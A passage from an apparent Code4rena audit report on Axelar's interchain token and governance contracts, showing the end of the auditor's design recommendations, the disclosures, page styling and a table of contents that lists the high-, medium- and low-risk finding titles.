in the NatSpec for the function would be useful. But in general, the meaning of all parameters and return values is valuable information. Similarly, it is not clear in <code>TokenManagerDeployer</code> and <code>StandardizedTokenDeployer</code> that these are meant to be used through <code>delegatecalls</code>. Without some documentation, it looks like someone could try to deploy tokens or managers by calling these directly.</li>\n<li>I’ve noticed the project is not using any external dependencies (e.g. OpenZeppelin libraries) that could greatly simplify the codebase; the project could reuse token contracts or even rely on a third-party multisig implementation. I assume this is a conscious choice, and would love to hear more about the rationale for this. It’s worth pointing out as a tradeoff where it’s unclear if the risk of bugs in third-party code outweighs the risks from lots of additional custom code.</li>\n<li>The use of <code>commandId := calldataload(4)</code> in some command processing functions suggests that it would be cleaner to pass the <code>commandId</code> to the internal <code>_execute</code> functions explicitly to avoid the need to use assembly. This assignment is a sort of “out-of-band” parameter-passing mechanism and could be prone to errors, as it obscures the fact that the params for <code>_execute</code> are not everything that the function needs from the caller. If there is a concern for backward compatibility, a separate <code>_executeWithCommandId</code> or similar could be added to <code>AxelarExecutable</code>.</li>\n<li>Interchain calls add complexity to any codebase, and are hard to reason out, so I strongly suggest adding automated end-to-end tests if you don’t have them already. Ideally, these tests would run on a testnet or local but real nodes for at least two different chains, and test running governance actions or token transfers between the two. I appreciate this is very time consuming, but it helps mitigate a lot of the risks.</li>\n</ul>\n<h3 id=\"time-spent\" style=\"position:relative;\"><a href=\"#time-spent\" aria-label=\"time spent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time spent:</h3>\n<p>13 hours</p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk17 { color: #808080; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk14 { color: #F44747; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-2\">High Risk Findings (2)</a></p>\n<ul>\n<li><a href=\"#h-01-expressreceivetoken-can-be-abused-using-reentry\">[H-01] <code>expressReceiveToken</code> can be abused using reentry</a></li>\n<li><a href=\"#h-02-erc777-and-similar-token-implementations-allow-a-stealing-of-funds-when-transferring-tokens\">[H-02] ERC777 and similar token implementations allow a stealing of funds when transferring tokens</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-9\">Medium Risk Findings (9)</a></p>\n<ul>\n<li><a href=\"#m-01-interchain-token-transfer-can-be-dossed-due-to-flow-limit\">[M-01] Interchain token transfer can be dossed due to flow limit</a></li>\n<li><a href=\"#m-02-tokenmanagers-flow-limit-logic-is-broken-for-erc777-tokens\">[M-02] <code>TokenManager</code>’s flow limit logic is broken for <code>ERC777</code> tokens</a></li>\n<li><a href=\"#m-03-remoteaddressvalidator-can-incorrectly-convert-addresses-to-lowercase\">[M-03] <code>RemoteAddressValidator</code> can incorrectly convert addresses to lowercase</a></li>\n<li><a href=\"#m-04-proposal-requiring-native-coin-transfers-cannot-be-executed\">[M-04] Proposal requiring native coin transfers cannot be executed</a></li>\n<li><a href=\"#m-05-gas-fees-are-refunded-to-a-wrong-address-when-transferring-tokens-via-interchaintokeninterchaintransferfrom\">[M-05] Gas fees are refunded to a wrong address when transferring tokens via <code>InterchainToken.interchainTransferFrom</code></a></li>\n<li><a href=\"#m-06-deployer-wallet-retains-ability-to-spoof-validated-senders-after-ownership-transfer\">[M-06] Deployer wallet retains ability to spoof validated senders after ownership transfer</a></li>\n<li><a href=\"#m-07-multisig-can-execute-the-same-proposal-repeatedly\">[M-07] Multisig can execute the same proposal repeatedly</a></li>\n<li><a href=\"#m-08-insufficient-support-for-tokens-with-different-decimals-on-different-chains-lead-to-loss-of-funds-on-cross-chain-bridging\">[M-08] Insufficient support for tokens with different decimals on different chains lead to loss of funds on cross-chain bridging</a></li>\n<li><a href=\"#m-09-interchainproposalexecutorsol-doesnt-support-non-evm-address-as-caller-or-sender\">[M-09] <code>InterchainProposalExecutor.sol</code> doesn’t support non-evm address as caller or sender</a></li>\n<li><a href=\"#m-10-contracts-are-vulnerable-to-fee-on-transfer-accounting-related-issues\">[M-10] Contracts are vulnerable to fee-on-transfer accounting-related issues</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#low-issue-summary\">Low Issue Summary</a></li>\n<li><a href=\"#suggested-issue-summary\">Suggested Issue Summary</a></li>\n<li><a href=\"#refactor-issue-summary\">Refactor Issue Summary</a></li>\n<li><a href=\"#non-criticalinformational-issue-summary\">Non-Critical/Informational Issue Summary</a></li>\n<li><a href=\"#l-01-finalproxy-can-be-hijacked-by-vulnerable-implementation-contract\">L-01 <code>FinalProxy</code> can be hijacked by vulnerable implementation contract</a></li>\n<li><a href=\"#l-02-a-users-tokens-can-be-stolen-if-they-dont-control-msgsender-address-on-all-chains\">L-02 A users tokens can be stolen if they don’t control <code>msg.sender</code> address on all chains</a></li>\n<li><a href=\"#l-03-no-event-emitted-when-a-vote-is-cast-in-multisigbase\">L-03 No event emitted when a vote is cast in <code>MultisigBase</code></a></li>\n<li><a href=\"#l-04-interchaintokenservice-non-remote-deploy-calls-accept-eth-but-are-not-using-it\">L-04 <code>InterchainTokenService</code> non-remote deploy calls accept <code>eth</code>, but are not using it</a></li>\n<li><a href=\"#l-05-default-values-for-deployandregisterstandardizedtoken-can-make-it-complicated-for-third-party-implementers\">L-05 Default values for <code>deployAndRegisterStandardizedToken</code> can make it complicated for third party implementers</a></li>\n<li><a href=\"#l-06-interchaintokenserviceproxy-is-finalproxy\">L-06 <code>InterchainTokenServiceProxy</code> is <code>FinalProxy</code></a></li>\n<li><a href=\"#l-07-low-level-call-will-always-succeed-for-non-existent-addresses\">L-07 Low level <code>call</code> will always succeed for non-existent addresses</a></li>\n<li><a href=\"#l-08-interchaintokenservicegetimplementation-returns-address0-for-invalid-types\">L-08 <code>InterchainTokenService::getImplementation</code> returns <code>address(0)</code> for invalid types</a></li>\n<li><a href=\"#l-09-consider-a-two-way-transfer-of-governance\">L-09 Consider a two way transfer of <code>governance</code></a></li>\n<li><a href=\"#l-10-consider-a-two-way-transfer-of-operator-and-distributor\">L-10 Consider a two way transfer of <code>operator</code> and <code>distributor</code></a></li>\n<li><a href=\"#s-01-consider-adding-a-version-to-upgradable-contracts\">S-01 Consider adding a version to upgradable contracts</a></li>\n<li><a href=\"#r-01-sourceaddress-means-two-different-things-in-interchaintokenservice\">R-01 <code>sourceAddress</code> means two different things in <code>InterchainTokenService</code></a></li>\n<li><a href=\"#r-02-interchaintokenservice_validatetoken-could-have-a-more-descriptive-name\">R-02 <code>InterchainTokenService::_validateToken</code> could have a more descriptive name</a></li>\n<li><a href=\"#r-03-axelargatewayonlymintlimiter-could-have-a-more-descriptive-name\">R-03 <code>AxelarGateway::onlyMintLimiter</code> could have a more descriptive name</a></li>\n<li><a href=\"#n-01-remoteaddressvalidator_lowercase-will-not-work-for-solana-addresses\">N-01 <code>RemoteAddressValidator::_lowerCase</code> will not work for Solana addresses</a></li>\n<li><a href=\"#n-02-interchaingovernance-can-be-abstract\">N-02 <code>InterchainGovernance</code> can be <code>abstract</code></a></li>\n<li><a href=\"#n-03-eta-in-proposalcancelled-event-can-be-misleading\">N-03 <code>eta</code> in <code>ProposalCancelled</code> event can be misleading</a></li>\n<li><a href=\"#n-04-incomplete-natspec\">N-04 Incomplete NatSpec</a></li>\n<li><a href=\"#n-05-erroneous-comments\">N-05 Erroneous comments</a></li>\n<li><a href=\"#n-06-typos-and-misspellings\">N-06 Typos and misspellings</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#gas-optimization-issue-summary\">Gas Optimization Issue Summary</a></li>\n<li><a href=\"#g-01-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\">G-01 Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</a></li>\n<li><a href=\"#g-02-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\">G-02 Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in external functions saves gas</a></li>\n<li><a href=\"#g-03-avoiding-the-overhead-of-bool-storage\">G-03 Avoiding the overhead of <code>bool</code> storage</a></li>\n<li><a href=\"#g-04-avoid-contract-existence-checks-by-using-low-level-calls\">G-04 Avoid contract existence checks by using low level calls</a></li>\n<li><a href=\"#g-05-use-calldata-pointer-saves-more-gas-than-memory-pointer\">G-05 Use <code>calldata</code> pointer. Saves more gas than <code>memory</code> pointer</a></li>\n<li><a href=\"#g-06-ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\">G-06 <code>IF’s/require()</code> statements that check input arguments should be at the <code>top</code> of the function</a></li>\n<li><a href=\"#g-07-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G-07 Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#g-08-optimize-names-to-save-gas\">G-08 Optimize names to save gas</a></li>\n<li><a href=\"#g-09-default-value-initialization\">G-09 Default value initialization</a></li>\n<li><a href=\"#g-10-use-constants-instead-of-typeuintxmax\">G-10 Use constants instead of <code>type(uintX).max</code></a></li>\n<li><a href=\"#g-11-splitting-requireif-statements-that-use--saves-gas\">G-11 Splitting <code>require()/if()</code> statements that use <code>&#x26;&#x26;</code> saves gas</a></li>\n<li><a href=\"#g-12-caching-global-variables-is-more-expensive-than-using-the-actual-variable-use-msgsender-instead-of-caching-it\">G-12 Caching global variables is more expensive than using the actual variable (use <code>msg.sender</code> instead of caching it)</a></li>\n</ul>\n</li>\n<li><a href=\"#audit-analysis\">Audit Analysis</a></li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}